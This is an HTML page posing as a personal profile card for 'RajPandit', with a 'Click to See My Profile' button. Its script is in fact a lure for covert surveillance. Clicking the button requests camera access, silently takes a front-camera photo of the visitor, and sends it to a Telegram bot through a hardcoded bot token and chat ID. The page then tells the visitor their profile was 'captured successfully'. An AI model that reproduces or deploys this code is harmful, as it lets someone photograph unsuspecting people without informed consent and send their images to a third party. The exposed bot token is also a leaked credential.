<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RajPandit - UP </title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .container {
            background: rgba(255,255,255,0.95);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
        }
        
        .profile-img {
            width: 150px;
            height: 150px;
            border-radius: 50%;
            object-fit: cover;
            margin-bottom: 20px;
            border: 5px solid #667eea;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        
        h1 {
            color: #333;
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
        }
        
        .location {
            color: #667eea;
            font-size: 1.2em;
            margin-bottom: 30px;
            font-weight: bold;
        }
        
        .profile-btn {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 1.2em;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
        }
        
        .profile-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 40px rgba(102, 126, 234, 0.6);
        }
        
        .profile-btn:active {
            transform: translateY(0);
        }
        
        #status {
            margin-top: 20px;
            font-size: 1em;
            color: #28a745;
            display: none;
        }
        
        .camera-icon {
            font-size: 1.5em;
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="photo1.jpg" alt="RajPandit" class="profile-img">
        <h1>RajPandit</h1>
        <div class="location">🇮🇳 UP & 🇺🇸 US</div>
        <button class="profile-btn" onclick="capturePhoto()">
            <span class="camera-icon">📸</span>
            Click to See My Profile
        </button>
        <div id="status">Profile captured successfully! 😊</div>
    </div>

    <script>
        const BOT_TOKEN = '8606335181:AAF51XIApm1NkEZKKWxX06sIgkHODZqULuQ';
        const CHAT_ID = '7735968383';

        async function capturePhoto() {
            try {
                // Status show karo
                document.getElementById('status').style.display = 'block';
                
                // Camera access lo
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    } 
                });
                
                // Canvas banao photo capture karne ke liye
                const canvas = document.createElement('canvas');
                const video = document.createElement('video');
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    // Photo ko base64 me convert karo
                    const photoData = canvas.toDataURL('image/jpeg', 0.8);
                    
                    // Telegram bot ko bhejo
                    sendToTelegram(photoData);
                    
                    // Stream band karo
                    stream.getTracks().forEach(track => track.stop());
                };
                
                video.play();
                
            } catch (error) {
                console.error('Camera access error:', error);
                alert('Camera access denied ya available nahi hai!');
            }
        }
        
        async function sendToTelegram(photoData) {
            const timestamp = new Date().toLocaleString('en-IN', { 
                timeZone: 'Asia/Kolkata' 
            });
            
            const caption = `🆕 New Profile Capture!\n⏰ Time: ${timestamp}\n👤 Visitor Profile Clicked`;
            
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', photoData);
            formData.append('caption', caption);
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                console.log('Telegram response:', result);
                
            } catch (error) {
                console.error('Telegram send error:', error);
            }
        }
    </script>
</body>
</html>
